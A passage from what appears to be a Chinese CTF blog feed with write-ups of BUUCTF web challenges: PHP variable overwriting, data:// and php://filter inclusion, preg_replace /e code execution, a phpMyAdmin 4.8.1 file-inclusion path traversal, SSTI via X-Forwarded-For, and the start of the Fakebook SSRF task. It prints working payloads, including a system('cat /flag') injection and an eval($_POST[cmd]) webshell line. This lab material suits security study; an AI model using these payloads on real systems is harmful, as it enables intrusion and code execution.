class="hljs-variable">$flag</span>;<br></code></pre></td></tr></table></figure><h5 id="代码审计："><a href="#代码审计：" class="headerlink" title="代码审计："></a>代码审计：</h5><h6 id="摘抄部分"><a href="#摘抄部分" class="headerlink" title="摘抄部分"></a>摘抄部分</h6><p><img src="/2021/08/07/2021/ctf/9/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjIyNDQy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>代码中的变量覆盖漏洞</strong></p><p><img src="/2021/08/07/2021/ctf/9/202005042321468.png" alt="在这里插入图片描述"></p><p><strong>尝试第一个exit处</strong>，</p><p>看注释，键名不能有flag，而且又要键名为flag的键值等于其中一个键名，你又要我不存在，又要我存在，进不去这个判断，告辞</p><p><img src="/2021/08/07/2021/ctf/9/1.jpg" alt="在这里插入图片描述"></p><p><strong>尝试第二个exit处</strong></p><p>我们想要通过单纯的post参数搞定它是不可能的，因为post处的变量覆盖是让它变成我们可控的值，所以搞不定。</p><p>所以可以通过单纯的get或者get+post搞定</p><p>可以看到这里是输出的$yds变量，那么我们就要通过变量覆盖达到$yds=$flag的效果</p><p>直接说答案比较好分析：get传参 yds=flag；<br>我们看看参数的传递流程：</p><p><img src="/2021/08/07/2021/ctf/9/20200504233307150.png" alt="在这里插入图片描述"></p><p><strong>分析：</strong></p><p>在这个里面，首先是 <strong>$x=yds,$=fla</strong>g 。把它带进foreach里面，就变成了$yds=$flag 。</p><p>**$$x就相当于是$($x)**，这样就非常好理解变量覆盖漏洞了。</p><h5 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">yds</span>=flag<br></code></pre></td></tr></table></figure><p><img src="/2021/08/07/2021/ctf/9/image-20210807155151631.png" alt="image-20210807155151631"></p><h5 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h5><p>这里是利用了exit($is)。</p><p>我们首先看看，要进入判断，执行exit($is)需要的条件，看注释。</p><p><img src="/2021/08/07/2021/ctf/9/20200504233744435.png" alt="在这里插入图片描述"></p><p>那我们就先从post型flag=flag开始：</p><p>我们post的数据，会在这一步，把原来的$flag的值改变，因为$x=flag,$y=flag，然后带进去变成了$flag=flag。</p><p>over，原来的flag值被我们整没了，这条路不通：</p><p><img src="/2021/08/07/2021/ctf/9/20200504233839775.png" alt="在这里插入图片描述"></p><p>我们试试get型的flag=flag：<br>（答案：is=flag&amp;flag=flag）</p><p><img src="/2021/08/07/2021/ctf/9/20200504234208601.png" alt="在这里插入图片描述"></p><p>首先分析变量覆盖处：</p><p>首先是$x=is,$y=flag,带进去就变成了$is=$flag;<br>现在到了第二个参数,$x=flag,$y=flag，带进去变成$flag=$flag，自己变成自己，没啥影响，没有改变flag 的值，成功。</p><p><img src="/2021/08/07/2021/ctf/9/image-20210807155750060.png" alt="image-20210807155750060"></p><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>参考博客：</p><p> <a href="https://blog.csdn.net/jianpanliu/article/details/107028582">BJDCTF2020]Mark loves cat_qtL0ng的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_43622442/article/details/105925473">BJDCTF2020]Mark loves cat (两种解法)（变量覆盖漏洞）_H9_dawn的博客-CSDN博客</a></p><p><a href="https://www.jianshu.com/p/a4d782e91852">CTF之php变量覆盖漏洞 - 简书 (jianshu.com)</a></p><p><a href="https://www.jianshu.com/p/a4d782e91852">CTF之php变量覆盖漏洞 - 简书 (jianshu.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020 ZJCTF，不过如此</title>
      <link href="/2021/08/06/2021/ctf/8/"/>
      <url>/2021/08/06/2021/ctf/8/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-知识点"><a href="#0x00-知识点" class="headerlink" title="0x00 知识点"></a>0x00 知识点</h3><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents:"></a>file_get_contents:</h4><p>file_get_contents函数把整个文件读入一个字符串中。</p><h5 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h5><p>file_get_contents(path,include_path,context,start,max_length)</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">path</td><td align="left">必需。规定要读取的文件。</td></tr><tr><td align="left">include_path</td><td align="left">可选。如果也想在 include_path 中搜寻文件的话，可以将该参数设为 “1”。</td></tr><tr><td align="left">context</td><td align="left">可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 null，则忽略。</td></tr><tr><td align="left">start</td><td align="left">可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 新加的。</td></tr><tr><td align="left">max_length</td><td align="left">可选。规定读取的字节数。该参数是 PHP 5.1 新加的。</td></tr></tbody></table><h5 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;test.txt&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">This <span class="hljs-keyword">is</span> a test <span class="hljs-built_in">file</span> <span class="hljs-keyword">with</span> test <span class="hljs-built_in">text</span>.<br></code></pre></td></tr></table></figure><h4 id="text-plain"><a href="#text-plain" class="headerlink" title="text/plain"></a>text/plain</h4><p><a href="https://www.cnblogs.com/soundcode/p/4572251.html">text/html与text/plain有什么区别？ - 左正 - 博客园 (cnblogs.com)</a></p><p>text/plain的意思是将文件设置为纯文本的形式，浏览器在获取到这种文件时并不会对其进行处理。</p><h4 id="PHP伪协议中的data-协议"><a href="#PHP伪协议中的data-协议" class="headerlink" title="PHP伪协议中的data://协议"></a>PHP伪协议中的data://协议</h4><p>摘抄于：<a href="https://blog.csdn.net/qq_46091464/article/details/106665358">文件包含漏洞之PHP伪协议中的data://的那些事~_Firebasky的博客-CSDN博客</a></p><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//include.php</span><br><span class="hljs-meta">&lt;?php</span><br>    @$file  = $_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    @<span class="hljs-keyword">include</span>($file);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=data:<span class="hljs-comment">//text/plain,<span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>无法使用</strong></p><p>payload2：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=data:<span class="hljs-regexp">//</span>text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+<br></code></pre></td></tr></table></figure><p><strong>无法使用</strong></p><p>payload3：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain;base64,*PD9waHAgc3lzdGVtKCJkaXIiKTs/</span>Pg==*<br></code></pre></td></tr></table></figure><p><strong>可以使用</strong></p><p>总结：<br>通过实验发现这个可能是编码的问题因为<?php phpinfo();?>在编成base64的时候出现了+。而浏览器不认识+号。所以解决方法</p><p>1.不写后面的?&gt; 因为PHP里面其实不需要写后面的 前面的；号就已经说明结束了。如果没有；号就必须写?&gt;作为结束。</p><p>2.添加空格改变base64编码。</p><p>3.将+号换成%2b</p><p>所以其实不需要通过base64编码来实现！！！<br>将<?php phpinfo();?>改变成url编码。这样浏览器可以识别！<br><img src="/2021/08/06/2021/ctf/8/20200610150733928.png" alt="在这里插入图片描述"></p><h4 id="php-filter协议"><a href="#php-filter协议" class="headerlink" title="php://filter协议"></a>php://filter协议</h4><p>摘抄于：</p><p><a href="https://blog.csdn.net/destiny1507/article/details/82347371">php://filter 的使用_hhh-CSDN博客</a></p><p>​    php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；</p><p>​    根据名字，filter，可以很容易想到这个协议可以用来过滤一些东西；</p><p>构造：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>recource=index.php<br></code></pre></td></tr></table></figure><p>​    这句话的意思是我们用base64编码的方式来读文件index.php；</p><p>​    这时页面会显示出源文件index.php经过base64编码后的内容，然后经过base64解码就可以看到flag；</p><p><strong>总之呢，php://filter协议有一下几个应用：</strong></p><p>1、利用base64获得源码</p><p>2、通过读写编码实行绕过操作</p><p><strong>问：为什么需要用base64才可以看到源码 如果本地源码是明文的话那是不是不用过滤器</strong>？</p><p>​    include一个文件中有php代码会进行php解析，如果是明文，则会直接返回明文。用了过滤器，如果是php文件就不会解析，就可以拿到php文件的源码了</p><p>​    先把要读取的内容经过base64编码然后才能显示出来，之后我们再经过解码就可以是可读的了</p><h4 id="preg-replace（）函数"><a href="#preg-replace（）函数" class="headerlink" title="preg_replace（）函数"></a>preg_replace（）函数</h4><p>文章：<a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行 - 先知社区 (aliyun.com)</a></p><h3 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h3><p><img src="/2021/08/06/2021/ctf/8/image-20210806084045764.png" alt="image-20210806084045764"></p><p>代码内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br>$text = $_GET[<span class="hljs-string">&quot;text&quot;</span>];<br>$file = $_GET[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;I have a dream&quot;</span>))&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>  <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,$file))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not now!&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">include</span>($file); <span class="hljs-comment">//next.php</span><br><br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>  highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><br></code></pre></td></tr></table></figure><p>传两个参数，text和file，之间用&amp;连接即可</p><p>目的是获得下列提示的    next.php</p><p>要满足传入的文件内容为：I have a dream</p><p>使用php伪协议中的data:协议和php的filter:协议</p><p>构造：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?text=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain,I have a dream&amp;file=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode/resource=<span class="hljs-keyword">next</span>.php<br></code></pre></td></tr></table></figure><p><img src="/2021/08/06/2021/ctf/8/image-20210806083956451.png" alt="image-20210806083956451"></p><p>解码后代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>$id = $_GET[<span class="hljs-string">&#x27;id&#x27;</span>];<br><br>$_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>] = $id;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params">$re, $str</span>) </span>&#123;<br><br>  <span class="hljs-keyword">return</span> preg_replace(<br><br>​    <span class="hljs-string">&#x27;/(&#x27;</span> . $re . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br><br>​    <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br><br>​    $str<br><br>  );<br><br>&#125;<br><br><span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $re =&gt; $str) &#123;<br><br>  <span class="hljs-keyword">echo</span> complex($re, $str). <span class="hljs-string">&quot;\n&quot;</span>;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>  @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>发现 preg_replace（）函数是一个代码执行的问题</p><p>发现这是用固定解题格式： <strong>\S*=${}</strong></p><p><strong>payload1</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">next</span>.php?\S*=<span class="hljs-variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="/2021/08/06/2021/ctf/8/image-20210806091905315.png" alt="image-20210806091905315"></p><p><strong>payload2</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">next</span>.php?\S*=$&#123;<span class="hljs-built_in">eval</span>($_POST[cmd])&#125;<br></code></pre></td></tr></table></figure><p>输错就会·提示相关函数过滤（这里我是斜杆的符号方向输错导致被匹配过滤）</p><p><img src="/2021/08/06/2021/ctf/8/image-20210806092259983.png" alt="image-20210806092259983"></p><p>上传成功：</p><p><img src="/2021/08/06/2021/ctf/8/image-20210806092509267.png" alt="image-20210806092509267"></p><p><img src="/2021/08/06/2021/ctf/8/image-20210806092557240.png" alt="image-20210806092557240"></p><p>或者</p><p><img src="/2021/08/06/2021/ctf/8/image-20210806092640868.png" alt="image-20210806092640868"></p><p>借鉴博客：[<a href="https://blog.csdn.net/qq_48008847/article/details/118804275">BJDCTF2020]ZJCTF，不过如此1_十九不瞌睡的博客-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF·rce </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GWCTF 2019 我有一个数据库&amp;BJDCTF2020 The mystery of ip</title>
      <link href="/2021/08/03/2021/ctf/7/"/>
      <url>/2021/08/03/2021/ctf/7/</url>
      
        <content type="html"><![CDATA[<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>打开页面，奇怪的乱码：</p><p><img src="/2021/08/03/2021/ctf/7/image-20210803200638733.png" alt="image-20210803200638733"></p><p>找了一个乱码恢复页面：<a href="http://www.mytju.com/classcode/tools/messycoderecover.asp">乱码恢复 (mytju.com)</a></p><p><img src="/2021/08/03/2021/ctf/7/image-20210803200740870.png" alt="image-20210803200740870"></p><p>在utf8格式下，只得到了无用信息：空的数据?我有一个数据库，但里面什么也没有~不信你找</p><p>在f12也不行后，我果断地拿起来神器——dirsearch！</p><p>一通扫描后果然有了眉目：</p><p><img src="/2021/08/03/2021/ctf/7/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(356).png"></p><p><img src="/2021/08/03/2021/ctf/7/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(357).png"></p><p>进入到<a href="http://e8451be4-2c39-421e-888a-2f04ad6a6de6.node4.buuoj.cn/phpmyadmin/index.php">e8451be4-2c39-421e-888a-2f04ad6a6de6.node4.buuoj.cn / mysql | phpMyAdmin 4.8.1</a></p><p><img src="/2021/08/03/2021/ctf/7/image-20210803201030523.png" alt="image-20210803201030523"></p><p>熟悉的phpmyadmin数据库页面</p><p>但是到了这里我就懵了，因为没有足够权限好像查不到flag在哪</p><p>查看了wp</p><p>原来这个版本漏洞可以利用，PhpMyadmin后台文件包含漏洞</p><h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV+LmMK#rd">【首发】phpmyadmin4.8.1后台getshell (qq.com)</a></p><p><a href="https://www.jianshu.com/p/fb9c2ae16d09">cve-2018-12613-PhpMyadmin后台文件包含 - 简书 (jianshu.com)</a></p><p>​    index.php中</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;target&#x27;</span>];<br></code></pre></td></tr></table></figure><p>利用参数target</p><p>相关poc从参考文章中可知</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">target=db_datadict.php%<span class="hljs-number">253</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../<br></code></pre></td></tr></table></figure><p>经过尝试发现，读取时可以尽量多下几级（多../../）无影响，反之若少了则会报错</p><p>如下图</p><p><img src="/2021/08/03/2021/ctf/7/image-20210803202146319.png" alt="image-20210803202146319"></p><p><img src="/2021/08/03/2021/ctf/7/image-20210803202211040.png" alt="image-20210803202211040"></p><h5 id="Tips："><a href="#Tips：" class="headerlink" title="Tips："></a>Tips：</h5><p>另外还有一种解法，来自于上面的 ’首发‘ 链接</p><p>将一句话木马写入数据库，然后在文件包含漏洞使之成功访问，蚁剑连接。</p><p>参考博客：</p><p><a href="https://blog.csdn.net/SopRomeo/article/details/105536972">GWCTF 2019]我有一个数据库_SopRomeo的博客-CSDN博客</a></p><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p><img src="/2021/08/03/2021/ctf/7/image-20210804210338451.png" alt="image-20210804210338451"></p><p>分别查看Flag、Hint</p><p><img src="/2021/08/03/2021/ctf/7/image-20210804211511008.png" alt="image-20210804211511008"></p><p><img src="/2021/08/03/2021/ctf/7/image-20210804210443630.png" alt="image-20210804210443630"></p><p>看了源码，没有什么可以利用信息</p><p>查看wp，知道了标题的ip有所指</p><p>我们的ip能够被获取，怀疑是与XFF有关</p><p>接着我们进入火狐验证想法</p><p>添加X-Forwarded-For:127.0.0.1</p><p><img src="/2021/08/03/2021/ctf/7/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(366).png" alt="屏幕截图(366)"></p><p>看到回显显示：Your IP is : 127.0.0.1</p><p>说明了想法正确</p><p>利用模板注入</p><p><img src="/2021/08/03/2021/ctf/7/image-20210804211235273.png" alt="image-20210804211235273"></p><p><img src="/2021/08/03/2021/ctf/7/image-20210804211318879.png" alt="image-20210804211318879"></p><h5 id="知识点：SSTI模板注入"><a href="#知识点：SSTI模板注入" class="headerlink" title="知识点：SSTI模板注入"></a>知识点：SSTI模板注入</h5><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</a></p><p><img src="/2021/08/03/2021/ctf/7/1625650-20200216204049347-1844990197.png" alt="img"></p><p>模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程<br>服务端把用户输入的内容渲染成模板就可能造成SSTI(Server-Side Template Injection)</p><h3 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h3><h5 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h5><p><a href="https://blog.csdn.net/fightte/article/details/117003439">BJDCTF2020]The mystery of ip_fightte的博客-CSDN博客</a></p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12318630.html">BJDCTF2020]The mystery of ip - 王叹之 - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯 2018 Fakebook</title>
      <link href="/2021/08/02/2021/ctf/6/"/>
      <url>/2021/08/02/2021/ctf/6/</url>
      
        <content type="html"><![CDATA[<h4 id="题记"><a href="#题记" class="headerlink" title="题记"></a>题记</h4><p>先纪念一下啊，调试了好长一段时间才成功的扫描工具<strong>dirsearch</strong></p><p>总结运行成功的几个条件：</p><p>1.安装python版本3.7及以上，且要确保cmd命令行内默认版本正确（因为之前我为了使用GitHack而更改了python解释器）。</p><p>2.遇到如下报错时：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql">Traceback (most recent <span class="hljs-keyword">call</span> <span class="hljs-keyword">last</span>):<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\dirsearch.py&quot;</span>, line <span class="hljs-number">28</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> lib.controller.controller <span class="hljs-keyword">import</span> Controller<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\lib\controller\__init__.py&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> .controller <span class="hljs-keyword">import</span> Controller  <span class="hljs-comment"># noqa: F401</span><br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\lib\controller\controller.py&quot;</span>, line <span class="hljs-number">29</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> lib.connection.requester <span class="hljs-keyword">import</span> Requester<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\lib\connection\requester.py&quot;</span>, line <span class="hljs-number">30</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> thirdparty.requests_ntlm <span class="hljs-keyword">import</span> HttpNtlmAuth<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\thirdparty\requests_ntlm\__init__.py&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> .requests_ntlm <span class="hljs-keyword">import</span> HttpNtlmAuth<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\thirdparty\requests_ntlm\requests_ntlm.py&quot;</span>, line <span class="hljs-number">5</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> cryptography <span class="hljs-keyword">import</span> x509<br>ModuleNotFoundError: <span class="hljs-keyword">No</span> <span class="hljs-keyword">module</span> named <span class="hljs-string">&#x27;cryptography&#x27;</span><br></code></pre></td></tr></table></figure><p>说明库没装上，可以去pycharm里自行安装完整。</p><p>附上图:</p><p><img src="/2021/08/02/2021/ctf/6/image-20210802195925831.png"></p><p><img src="/2021/08/02/2021/ctf/6/image-20210802200037618.png"></p><p><img src="/2021/08/02/2021/ctf/6/image-20210802200638164.png"></p><p>dirseach自带的字典在db目录下，使用格式以及常用参数如下：<br>py dirsearch.py<code>-</code>u [target url]<code>-</code>e<code>*</code></p><p><strong>-<code>u后面跟要扫的url</code></strong></p><p><strong>-<code>e是指定的url</code></strong></p><p><strong>-<code>w是指定字典</code></strong></p><p><strong>-<code>r递归目录</code></strong></p><p><strong>-<code>random</code>-agents使用随机UA</strong></p><p>还可以调低线程：dirsearch.py -u url -e * –timeout=2 -t 1 -x 400,403,404,500,503,429</p><hr><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>打开后注册（join）进入·页面</p><p><img src="/2021/08/02/2021/ctf/6/image-20210803144611777.png" alt="image-20210803144611777"></p><p>点击后</p><p>发现了注入点：</p><p><img src="/2021/08/02/2021/ctf/6/image-20210803144818019.png" alt="image-20210803144818019"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">**Notice**:  unserialize(): Error <span class="hljs-keyword">at</span> <span class="hljs-built_in">offset</span> <span class="hljs-number">0</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">in</span> **/var/www/html/view.php** <span class="hljs-keyword">on</span> <span class="hljs-title">line</span> **<span class="hljs-title">31</span>**<br></code></pre></td></tr></table></figure><p>页面左上方提示了本题实际与序列化有关</p><p>查看wp知道了要用dirsearch扫描目录获取源文件</p><p>如下图状态码回响200时，出现了robots协议</p><p><img src="/2021/08/02/2021/ctf/6/image-20210802200638164.png" alt="image-20210802200638164"></p><p>按照提示访问下载user.php.bak</p><p><img src="/2021/08/02/2021/ctf/6/image-20210802200728401.png" alt="image-20210802200728401"></p><p>重命名为user.php,源打开代码：</p><p><img src="/2021/08/02/2021/ctf/6/image-20210802200825525.png" alt="image-20210802200825525"></p><h5 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h5><p><img src="/2021/08/02/2021/ctf/6/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjIyNDQy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="摘抄："><a href="#摘抄：" class="headerlink" title="摘抄："></a>摘抄：</h5><p>*<em>【</em>】curl_init ： 初始化一个cURL会话，供curl_setopt(), curl_exec()和curl_close() 函数使用。**</p><p>*<em>【</em>】curl_setopt ： 请求一个url。**<br><strong>其中CURLOPT_URL表示需要获取的URL地址，后面就是跟上了它的值。</strong></p><p>*<em>【</em>】CURLOPT_RETURNTRANSFER 将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。**</p><p>*<em>【</em>】curl_exec，成功时返回 TRUE， 或者在失败时返回 FALSE。 然而，如果 CURLOPT_RETURNTRANSFER选项被设置，函数执行成功时会返回执行的结果，失败时返回 FALSE 。**</p><p>*<em>【</em>】CURLINFO_HTTP_CODE ：最后一个收到的HTTP代码。**<br><strong>curl_getinfo：以字符串形式返回它的值，因为设置了CURLINFO_HTTP_CODE，所以是返回的状态码。</strong></p><p><strong>如果状态码不是404，就返回exec的结果。</strong></p><p><img src="/2021/08/02/2021/ctf/6/20200420141747970.png" alt="在这里插入图片描述"></p><p><strong>这里说明了传的参数是blog</strong></p><p>通过分析，我们知道了这题涉及反序列化和ssrf</p><h5 id="实操："><a href="#实操：" class="headerlink" 